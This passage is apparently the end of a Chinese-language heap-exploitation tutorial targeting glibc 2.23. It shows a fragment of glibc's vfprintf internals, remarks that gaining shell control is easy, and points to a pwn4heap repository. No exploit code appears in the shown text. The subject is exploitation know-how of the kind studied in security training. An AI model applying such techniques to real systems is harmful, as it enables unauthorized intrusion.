      done = -1;                                                               \
      __set_errno(EOVERFLOW);                                                  \
      goto all_done;                                                           \
    }                                                                          \
    done += (Len);                                                             \
  } while (0)
  
# define PUT(F, S, N)	_IO_sputn ((F), (S), (N))
```

显然，获取shell的控制权轻而易举。


### 未完待续...

## 参考

https://github.com/BinRacer/pwn4heap/tree/master/src/2.23
